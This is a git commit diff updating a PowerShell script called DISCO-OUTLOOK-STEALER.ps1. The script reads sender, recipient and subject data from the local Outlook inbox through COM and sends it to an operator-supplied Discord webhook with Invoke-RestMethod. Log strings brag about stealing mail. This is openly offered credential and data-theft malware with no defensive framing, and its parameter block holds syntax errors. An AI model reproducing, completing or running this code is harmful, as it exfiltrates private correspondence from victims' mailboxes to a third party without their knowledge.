90dfa93772e910ddac25fd2ee7187ffc8e1a6fd4
el-mo9awin1954dz <118679598+el-mo9awin1954dz@users.noreply.github.com>
2023-03-11 17:28:06 +0100

    Update DISCO-OUTLOOK-STEALER.ps1

--- DISCO-OUTLOOK-STEALER.ps1
+++ DISCO-OUTLOOK-STEALER.ps1
@@ -14,51 +14,80 @@ function Log-Message
 Log-Message " [*] START JOB ------------------- ELMO9AWIM "
 
 
-$olFolderInbox = 6
-$outlook = new-object -com outlook.application;
-$mapi = $outlook.GetNameSpace("MAPI");
-$inbox = $mapi.GetDefaultFolder($olFolderInbox)
-$inbox.items|Select SenderEmailAddress,to,subject|Format-Table -AutoSize |
+Function GET-OUTLOOK-TO-DISCORD{
+  Param(
+  [Parameter(Mandatory=$true,Position=0)] [String[]]$BFolder
+  [Parameter(Mandatory=$true,Position=1)] [String[]]$BSave
+  [Parameter(Mandatory=$False,Position=2)] [String[]]$BDiscordURL,  
+
+  )
+  
+  
+  
+  
+  Write-Output "OUTLOOK BOX: $BFolder || SAVE ON $BSave { HACK FOR FUN } "
+
+  $olFolderInbox = $BFolder
+  $outlook = new-object -com outlook.application;
+  $mapi = $outlook.GetNameSpace("MAPI");
+  $inbox = $mapi.GetDefaultFolder($olFolderInbox)
+  $STEAL = $inbox.items|Select SenderEmailAddress,to,subject|Format-Table -AutoSize 
+ 
+  Log-Message " [*] OUTLOOK MAIL BOX STEALED ------------------- ELMO9AWIM "
 
 
-#Store webhook url
-$webHookUrl = 'yourhookurl'
+  #Store webhook url
+  $webHookUrl = $BDiscordURL
 
-#Create embed array
-[System.Collections.ArrayList]$embedArray = @()
+  #Create embed array
+  [System.Collections.ArrayList]$embedArray = @()
 
-#Store embed values
-$title       = 'DISCORD STEALER'
-$description = 'DISCORD MAIL STEALER'
-$color       = '1'
+  #Store embed values
+  $title       = 'DISCORD STEALER'
+  $description = 'DISCORD MAIL STEALER'
+  $info        = $STEAL
 
-#Create thumbnail object
-$thumbUrl = 'https://static1.squarespace.com/static/5644323de4b07810c0b6db7b/t/5aa44874e4966bde3633b69c/1520715914043/webhook_resized.png' 
-$thumbnailObject = [PSCustomObject]@{
+  $color       = '1'
+
+  #Create thumbnail object
+  $thumbUrl = 'https://static1.squarespace.com/static/5644323de4b07810c0b6db7b/t/5aa44874e4966bde3633b69c/1520715914043/webhook_resized.png' 
+  $thumbnailObject = [PSCustomObject]@{
 
     url = $thumbUrl
 
-}
+  }
 
-#Create embed object, also adding thumbnail
-$embedObject = [PSCustomObject]@{
+  #Create embed object, also adding thumbnail
+  $embedObject = [PSCustomObject]@{
 
     title       = $title
     description = $description
     color       = $color
     thumbnail   = $thumbnailObject
+    info        = $STEAL
 
-}
+  }
 
-#Add embed object to array
-$embedArray.Add($embedObject) | Out-Null
+  #Add embed object to array
+  $embedArray.Add($embedObject) | Out-Null
 
-#Create the payload
-$payload = [PSCustomObject]@{
+  #Create the payload
+  $payload = [PSCustomObject]@{
 
     embeds = $embedArray
+    
 
+  }
+
+  #Send over payload, converting it to JSON
+  Invoke-RestMethod -Uri $webHookUrl -Body ($payload | ConvertTo-Json -Depth 4) -Method Post -ContentType 'application/json'
+  
+  Log-Message " [*] SEND TO DISCORD WEBHOOK ------------------- ELMO9AWIM "
+
+  
 }
 
-#Send over payload, converting it to JSON
-Invoke-RestMethod -Uri $webHookUrl -Body ($payload | ConvertTo-Json -Depth 4) -Method Post -ContentType 'application/json'
+Log-Message " [*] HACKER ARE JUST HEROS ------------------- ELMO9AWIM "
+
+GET-OUTLOOK-TO-DISCORD 
+
